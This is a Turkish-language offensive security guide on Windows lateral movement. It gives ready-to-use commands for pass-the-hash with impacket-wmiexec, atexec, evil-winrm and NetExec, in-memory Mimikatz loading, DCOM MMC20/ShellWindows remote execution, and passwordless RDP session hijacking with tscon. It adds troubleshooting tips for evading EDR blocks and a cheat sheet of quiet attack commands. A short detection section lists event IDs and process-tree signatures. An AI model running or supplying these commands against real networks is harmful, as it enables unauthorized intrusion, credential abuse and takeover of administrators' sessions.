## 1. Genel Bakış ve Mimari

Yanal hareket (Lateral Movement) aşamasında geçerli bir kimlik veya karma elde edildikten sonra temel amaç, bu yetkiyi kullanarak **başka bir hedef sistemde komut çalıştırmaktır**.

Saldırganlar bu aşamada genellikle yeni bir yazılım zafiyeti (0-day veya CVE) sömürmezler; bunun yerine Windows işletim sistemlerinin sistem yöneticileri için tasarladığı **meşru uzaktan yönetim protokollerini** istismar ederler:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                   UZAKTAN YÜRÜTME PROTOKOL MATRİSİ                          │
└─────────────────────────────────────────────────────────────────────────────┘
                                       │
     ┌─────────────────┬───────────────┼───────────────┬─────────────────┐
     ▼                 ▼               ▼               ▼                 ▼
[ PsExec / SMB ]  [ WMI Exec ]   [ WinRM / PS ]  [ DCOM Exec ]     [ RDP Tscon ]
 • Port: 445       • Port: 135     • Port: 5985    • Port: 135       • Port: 3389
 • Servis Kurar    • Disksiz       • HTTP/SOAP     • MMC20 / Shell   • Parolasız
 • Event 7045      • WmiPrvSE.exe  • ScriptBlock   • EDR Atlatma     • Canlı Masaüstü
```

Tüm bu kanallar kurumsal ağlarda her gün yüzlerce kez meşru olarak kullanıldığından, SOC/SIEM sistemleri için "normal yönetimsel aktivite" ile "kötücül yanal hareket" arasındaki farkı ayırt etmek zordur.

## 2. Teknik Derinlik ve Protokol Analizi

### 2.1 PsExec Ailesi (SMB ve Servis Denetleyicisi - SCM)
* **Çalışma Mekanizması:**
  1. İstemci hedef makinedeki `ADMIN$` veya `C$` paylaşımına bağlanır.
  2. Bir ikili dosya (örneğin `PSEXESVC.exe`) diske kopyalanır (smbexec kopyalamaz, doğrudan cmd çalıştırır).
  3. RPC (`\pipe\svcctl`) üzerinden Service Control Manager (SCM) ile iletişim kurularak yeni bir Windows Servisi oluşturulur (`CreateServiceW`).
  4. Servis başlatılır (`StartServiceW`) ve komut `NT AUTHORITY\SYSTEM` yetkisiyle çalışır.
  5. Çıktı bir Named Pipe (`\\.\pipe\...`) üzerinden saldırgana iletilir ve servis silinir.
* **OPSEC Zayıflığı:** Sistem günlüğünde **`Event ID 7045 (A new service was installed)`** ve güvenlik günlüğünde `Event ID 5145` oluşturur; EDR sistemleri tarafından en kolay yakalanan yöntemdir.

### 2.2 WMI (Windows Management Instrumentation — wmiexec)
* **Çalışma Mekanizması:**
  1. TCP port 135 üzerinden RPC uç noktası haritalanır ve dinamik bir RPC portuna geçilir.
  2. `Win32_Process.Create` metodu çağrılır.
  3. Süreç doğrudan `WmiPrvSE.exe` (WMI Provider Host) sürecinin çocuğu (child process) olarak başlar.
* **Avantajı:** Diske hiçbir `.exe` yazılmaz, yeni bir servis kurulmaz (`Event 7045` üretilmez). Ancak `WmiPrvSE.exe -> cmd.exe / powershell.exe` süreç ebeveyn-çocuk ilişkisi Sysmon Event 1 ile izlenebilir.

### 2.3 WinRM / PowerShell Remoting (WS-Management)
* HTTP port `5985` veya HTTPS port `5986` üzerinden SOAP/XML tabanlı REST benzeri bir protokol çalışır.
* Yürütme `wsmprovhost.exe` süreci altında gerçekleşir.
* **Kritik Risk:** PowerShell **Script Block Logging (Event ID 4104)** açıksa, çalıştırılan tüm script kodları açık metin olarak loglanır.

### 2.4 DCOM Tabanlı Yanal Hareket (Distributed Component Object Model)
WMI ve PsExec'in engellendiği ortamlarda, Windows DCOM arayüzleri en sessiz ve en güçlü alternatiftir:
* **`MMC20.Application`:** Microsoft Yönetim Konsolu DCOM sınıfı üzerinden doğrudan kabuk komutu çalıştırma:
  `Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "...", "7")`
* **`ShellWindows` / `ShellBrowserWindow`:** Windows Explorer DCOM nesnesi üzerinden `ShellExecute` ile süreç başlatma. Süreç `explorer.exe` altında başlar; EDR süreç ağacı analizlerini tamamen yanıltır.

### 2.5 RDP Session Hijacking (`tscon.exe`)
Hedef sunucuda SYSTEM yetkisi elde edildiğinde (örneğin PsExec veya Potato privesc ile), kullanıcıların kilitli veya arka planda çalışan canlı RDP masaüstlerine **parola gerekmeden** bağlanılabilir:
* `tscon.exe <Oturum_ID> /dest:<Hedef_Oturum>` komutu işletilir.
* Kurban yöneticinin masaüstü oturumu çalınarak saldırganın ekranına canlı olarak yansıtılır; açık belgeler, oturum açılmış kurumsal portallar ve admin konsolları anında kontrol altına alınır.

## 3. Pratik Uygulama ve İleri Düzey Senaryolar

### Senaryo 1: Impacket wmiexec ile Disksiz Yanal Hareket (PtH)

```bash
# 1. NT karması ile WMI üzerinden yarı-interaktif komut satırı açma
impacket-wmiexec -hashes :329153f560eb329c0e1deea55e88a1e9 Administrator@10.10.10.50

# 2. Tek komut çalıştırıp çıkma (OPSEC dostu - oturum açıp beklemez)
impacket-wmiexec -hashes :329153f560eb329c0e1deea55e88a1e9 Administrator@10.10.10.50 "whoami && ipconfig"
```

---

### Senaryo 2: Evil-WinRM ile PowerShell Üzerinden Yanal Hareket

```bash
# 1. Parola ile WinRM kabuğu açma
evil-winrm -i 10.10.10.50 -u Administrator -p 'Summer2024!'

# 2. NT karması (Pass-the-Hash) ile WinRM oturumu başlatma
evil-winrm -i 10.10.10.50 -u Administrator -H 329153f560eb329c0e1deea55e88a1e9

# 3. Bellekten script çalıştırma (Diske yazmadan script yükleme)
# Evil-WinRM oturumu içinde:
menu
Bypass-4K
Invoke-Mimikatz.ps1
```

---

### Senaryo 3: DCOM Nesneleri ile EDR Radarına Takılmadan Kod Yürütme

```powershell
# 1. MMC20.Application DCOM nesnesi üzerinden uzak sistemde komut tetikleme
$DCOM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.50"))
$DCOM.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\Windows\Temp\out.txt", "7")

# 2. ShellWindows DCOM nesnesi üzerinden çalıştırma (Explorer.exe child process üretir)
$SW = [activator]::CreateInstance([type]::GetTypeFromProgID("ShellWindows", "10.10.10.50"))
$SW.Item().Document.Application.ShellExecute("cmd.exe", "/c whoami", "C:\Windows\System32", $null, 0)
```

---

### Senaryo 4: tscon ile Parolasız RDP Oturumu Çalma (Session Hijacking)

```cmd
:: 1. Hedef sunucuda SYSTEM yetkisine sahip bir komut satırında aktif oturumları listeleyin
query user
:: Çıktı:
:: USERNAME    SESSIONNAME    ID    STATE    IDLE TIME
:: dadmin      rdp-tcp#1       2    Active           .
:: attacker    rdp-tcp#2       3    Active           .

:: 2. tscon ile kurban yöneticinin oturumunu kendi ekranınıza aktarın (Parola gerekmez!)
tscon 2 /dest:rdp-tcp#2

:: Sonuç: Hedef yöneticinin açık masaüstü anında önünüze gelir!
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Olası Kök Neden | Çözüm Adımı |
| :--- | :--- | :--- |
| `0x800706BA - The RPC server is unavailable` | Hedef sistemde Windows Güvenlik Duvarı port 135 veya dinamik RPC portlarını blokluyor. | SMB (445) veya WinRM (5985) portunu deneyin; ağ seviyesinde router/firewall kurallarını inceleyin. |
| `WinRM: (0x803380e4) Access Denied / 401 Unauthorized` | WinRM servisi etki alanı dışı istemcilere kapalıdır (`TrustedHosts`) veya hesap yerel yönetici Remote UAC filtresine takılmıştır. | RID 500 kullanın veya istemcide `Set-Item WSMan:\localhost\Client\TrustedHosts -Value *` uygulayın. |
| `PsExec: Event 7045 Blocked by EDR` | EDR yazılımı yeni servis oluşturma API çağrısını (`CreateService`) engelledi ve alarm üretti. | PsExec yerine servissiz çalışan **WMI**, **DCOM** veya **WinRM** yöntemine geçiş yapın. |
| `tscon: Error [7001]: Access is denied` | `tscon` komutu yerel yönetici (High) altında çalıştırıldı; SYSTEM yetkisi gereklidir. | Komutu çalıştırmadan önce `PsExec -s` veya `PrintSpoofer` ile `NT AUTHORITY\SYSTEM` yetkisine yükselin. |
| `DCOM: Class not registered (0x80040154)` | Hedef sistemde ilgili DCOM arayüzü (örneğin MMC20) devre dışıdır veya yüklü değildir. | Alternatif DCOM sınıflarına (`ShellBrowserWindow`, `Excel.Application`) geçiş yapın. |
| `WMI: Quota violation (0x8004106c)` | Hedef sistemde WMI bellek kotası dolmuştur veya eşzamanlı sorgu limiti aşılmıştır. | WMI oturumunu kapatıp birkaç dakika bekleyin; WMI yerine WinRM kullanın. |

## 5. Bıraktığı İz ve Karşı Tespit (OPSEC & Blue Eşleştirmesi)

### 5.1 Bıraktığı İzler (Artifacts & Telemetri)
* **System Event ID 7045 (A service was installed in the system):**
  * `ServiceName`: `PSEXESVC` veya Impacket tarafından rastgele üretilen 8-harfli servis adı (`BTOBTO...`).
  * `ImagePath`: `%SystemRoot%\...\servis.exe` (PsExec tespitinin en temel imzasıdır).
* **Security Event ID 4688 / Sysmon Event ID 1 (Process Creation):**
  * `ParentImage`: `C:\Windows\System32\wbem\WmiPrvSE.exe` (WMI tabanlı yürütme).
  * `ParentImage`: `C:\Windows\System32\wsmprovhost.exe` (WinRM yürütme).
  * `ParentImage`: `C:\Windows\explorer.exe` (DCOM ShellWindows yürütme).
* **PowerShell Event ID 4104 (ScriptBlock Logging):**
  * WinRM üzerinden çalıştırılan PowerShell script blokları açık metin olarak kaydedilir.

### 5.2 Ağ ve EDR İmzaları
* **İş İstasyonları Arası Ağ Taraması:** Normal kurumsal operasyonlarda iş istasyonları (Workstations) birbirlerinin 445, 135 veya 5985 portlarına bağlanmaz. WS-to-WS bağlantılar EDR tarafından doğrudan "Lateral Movement" olarak etiketlenir.

## 6. En Çok Kullanılan Komutlar (Hızlı Referans / Cheat Sheet)

```bash
# 1. Impacket wmiexec ile Disksiz Uzak Yürütme
impacket-wmiexec -hashes :329153f560eb329c0e1deea55e88a1e9 Administrator@10.10.10.50
# Ne Yapar?: WMI üzerinden servis kurmadan ve diske dosya yazmadan yarı-interaktif komut satırı açar.
# Ne Zaman Kullanılır?: EDR kurallarını atlatarak en sessiz şekilde yanal hareket yapmak için.

# 2. Evil-WinRM ile PowerShell Üzerinden Yanal Hareket
evil-winrm -i 10.10.10.50 -u Administrator -H 329153f560eb329c0e1deea55e88a1e9
# Ne Yapar?: WinRM portu (5985) üzerinden tam özellikli bir PowerShell yönetim oturumu açar.
# Ne Zaman Kullanılır?: Hedef sistemde WinRM aktif olduğunda ve script yüklemek istendiğinde.

# 3. DCOM (MMC20.Application) ile Gizli Uzak Yürütme (PowerShell)
$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.50"))
$c.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami", "7")
# Ne Yapar?: MMC konsolu DCOM nesnesini tetikleyerek hedefte kod çalıştırır; WMI logu üretmez.
# Ne Zaman Kullanılır?: WMI ve PsExec sistem tarafından engellendiğinde.

# 4. tscon ile Parolasız RDP Oturumu Çalma (SYSTEM Yetkisiyle)
tscon 2 /dest:console
# Ne Yapar?: Kurban yöneticinin kilitli veya açık RDP masaüstünü doğrudan saldırgan konsoluna bağlar.
# Ne Zaman Kullanılır?: Sunucuda SYSTEM hakları varken aktif Domain Admin RDP oturumu görüldüğünde.

# 5. NetExec ile Tek Komutla Uzaktan Yetki Doğrulama
nxc winrm 10.10.10.50 -u Administrator -H 329153f560eb329c0e1deea55e88a1e9 -x "hostname && whoami"
# Ne Yapar?: WinRM üzerinden tek satırda komut işletir; interaktif oturum bırakmaz.
# Ne Zaman Kullanılır?: Hızlı durum değerlendirmesi ve komut çalıştırma aşamasında.

# 6. Impacket atexec ile Zamanlanmış Görev Üzerinden Çalıştırma
impacket-atexec -hashes :329153f560eb329c0e1deea55e88a1e9 Administrator@10.10.10.50 "whoami"
# Ne Yapar?: Task Scheduler servisini kullanarak tek seferlik görev kurar, çalıştırır ve temizler.
# Ne Zaman Kullanılır?: SCM ve WMI erişimleri kısıtlandığında alternatif yürütme için.
```
